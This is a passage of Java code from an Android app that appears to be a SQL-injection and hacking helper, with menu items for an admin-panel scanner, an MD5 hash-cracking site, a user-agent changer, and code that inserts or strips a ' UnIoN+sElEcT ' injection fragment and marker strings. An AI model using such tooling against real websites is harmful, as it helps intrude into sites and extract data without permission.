								AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
									context);
								alertDialogBuilder.setView(prompt);

								final EditText Input = (EditText) prompt
									.findViewById(R.id.editText1);
								alertDialogBuilder
									.setCancelable(false)
									.setPositiveButton("OK",
									new DialogInterface.OnClickListener() {
										public void onClick(DialogInterface dialog,
															int id){

											if (Input.length()<1){

											}else{
												String ii = Input.getText().toString();

												int l=Integer.parseInt(ii);

												String txt = field2.getText().toString();
												int i = l;
												String restxt = "";
												for (int a = 0; a < i; a++) {
													restxt += "XxXAndRohAckBarXxX";
												}
												field2.setText(txt+restxt);
											
											}
										}
									})
									.setNegativeButton("Cancel",
									new DialogInterface.OnClickListener() {
										public void onClick(DialogInterface dialog,
															int id){


											String i = field2.getText().toString().replace(" UnIoN+sElEcT ", "");

											field2.setText(i);
											dialog.cancel();
										}
									});
								AlertDialog alertDialog = alertDialogBuilder.create();
								alertDialog.show();


								
							}


							return true;

						}
						return true;
					}
					return true;
				}
			});
		pop.show();
	}




	public void opt(View v){

		final Context context = this;
		PopupMenu pop = new PopupMenu(MainActivity.this, optb);
		pop.getMenuInflater().inflate(R.menu.opt, pop.getMenu());

		pop.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){
				public boolean onMenuItemClick(MenuItem item){

					
					
				 	if (item.getTitle().equals("PHP Script")){
					
						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.phpscript, null); 
						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);   
						alertDialogBuilder.setView(prompt);


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();
						
					}
		if (item.getTitle().equals("Disable Ads")){
					
			Toast.makeText(context, "Download the premium version on playstore.",
						   Toast.LENGTH_LONG).show();
			
						
					}
		
					if (item.getTitle().equals("User Agent")){
						
						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.uagent, null);

						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);
						alertDialogBuilder.setView(prompt);

						final EditText Input = (EditText) prompt
							.findViewById(R.id.editText1);
							
							Input.setText(System.getProperty("http.agent",""));
							
						alertDialogBuilder
							.setCancelable(true)
							.setPositiveButton("LOAD",
							new DialogInterface.OnClickListener() {
								public void onClick(DialogInterface dialog,
													int id){

									System.setProperty("http.agent",Input.getText().toString());
								}


							});
							
						AlertDialog alertDialog = alertDialogBuilder.create();
						alertDialog.show();
					}
					if (item.getTitle().equals("Reload")){
						browser.reload();
						Toast.makeText(context, "Reloading page..",
										   Toast.LENGTH_SHORT).show();

					}
				 	if (item.getTitle().equals("Manual")){


						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.instruction, null); 
						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);   
						alertDialogBuilder.setView(prompt);


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();

}
				 
					if (item.getTitle().equals("About")){


						LayoutInflater li = LayoutInflater.from(context);
						View prompt = li.inflate(R.layout.about, null); 
						AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
							context);   
						alertDialogBuilder.setView(prompt);


						AlertDialog alertDialog = alertDialogBuilder.create();


						alertDialog.show();



					}else if (item.getTitle().equals("Exit")){

						finish();
						System.exit(1);
					}else if (item.getTitle().equals("Hash killer")){

						if (!haveNetworkConnection()){
							Toast.makeText(context, "Please check internet connection.",
										   Toast.LENGTH_LONG).show();

						}else{
							browser.setWebViewClient(new MyBrowser());
							gostopb.setVisibility(View.VISIBLE);
							browser.getSettings().setLoadsImagesAutomatically(true);
							browser.getSettings().setJavaScriptEnabled(true);
							browser.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
							browser.loadUrl("http://md5.gromweb.com");
							p1.setVisibility(View.VISIBLE);
						}
					}else if (item.getTitle().equals("Admin Scanner")){

						if (!haveNetworkConnection()){
							Toast.makeText(context, "Please check internet connection.",
										   Toast.LENGTH_LONG).show();

						}else{
							try{
							Intent intent = new Intent(getApplicationContext(), aps.class);
							startActivity(intent);}
							catch(Exception e){
								
							}
									}					
					}

					return true;

				}
			});
		pop.show();
	}




	
	@Override
	public void onBackPressed(){

		Toast.makeText(context, "Back button disabled. Please use More > Exit.",
					   Toast.LENGTH_LONG).show();


	}@Override
	protected void onStop(){
		super.onStop();

	}


	@Override
	public void onDestroy(){
		super.onDestroy();
	}


}
/* zk.j4pz@zyberph.com */
